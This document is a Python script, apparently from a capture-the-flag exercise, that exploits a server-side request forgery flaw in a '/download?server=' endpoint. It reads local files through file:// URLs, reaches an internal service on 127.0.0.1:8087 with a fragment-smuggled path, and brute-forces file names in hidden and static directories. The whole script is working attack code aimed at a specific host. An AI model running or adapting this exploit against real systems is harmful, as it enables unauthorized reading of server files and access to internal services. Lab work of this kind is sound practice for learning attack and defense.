import requests

T = "http://10.82.168.213"

# Approach 1: file:// SSRF with verbose output
paths = [
    "/usr/src/app/public-docs/flag.txt",
    "/usr/src/app/private-docs/flag.txt",
    "/usr/src/app/static/flag.txt",
    "/usr/src/flag.txt",
    "/usr/src/app/flag.txt",
    "/flag.txt",
    "/tmp/flag.txt",
    "/root/flag.txt",
    "/usr/src/app/public-docs/note.txt",
    "/usr/src/app/private-docs/note.txt",
]

print("=== Approach 1: file:// SSRF ===")
for p in paths:
    try:
        r = requests.get(f"{T}/download?server=file://{p}?&id=1", timeout=6)
        t = r.content.decode(errors="replace")[:200]
        is_err = "Werkzeug" in t or "Couldn" in t
        status = "ERR" if is_err else "OK"
        print(f"  [{status}] {p} -> {r.status_code} ({len(r.content)}b) {t[:80]}")
    except Exception as e:
        print(f"  [EXC] {p} -> {e}")

# Approach 2: Via internal HTTP (port 8087) to access the public-docs route
print("\n=== Approach 2: SSRF via internal HTTP ===")
names = ["flag", "secret", "note", "readme", "key", "hint", "password", "admin"]
for name in names:
    # http://127.0.0.1:8087/public-docs-k057230990384293/{name}.txt
    url = f"{T}/download?server=http://127.0.0.1:8087/public-docs-k057230990384293/{name}.txt%23&id=1"
    try:
        r = requests.get(url, timeout=6)
        t = r.content.decode(errors="replace")[:200]
        is_err = "Not Found" in t or "Werkzeug" in t or len(r.content) == 0
        if not is_err:
            print(f"  [FOUND] {name}.txt -> {r.status_code} ({len(r.content)}b) {t}")
        else:
            print(f"  [MISS] {name}.txt")
    except Exception as e:
        print(f"  [EXC] {name}.txt -> {e}")

# Approach 3: Also directly via HTTP
print("\n=== Approach 3: Direct HTTP ===")
for name in names:
    url = f"{T}/public-docs-k057230990384293/{name}.txt"
    r = requests.get(url, timeout=5)
    if r.status_code == 200:
        print(f"  [FOUND] {name}.txt -> {r.text[:200]}")

# Approach 4: Static directory
print("\n=== Approach 4: Static dir ===")
for name in names:
    for ext in [".txt", ""]:
        url = f"{T}/static/{name}{ext}"
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            print(f"  [FOUND] /static/{name}{ext} -> {r.text[:200]}")
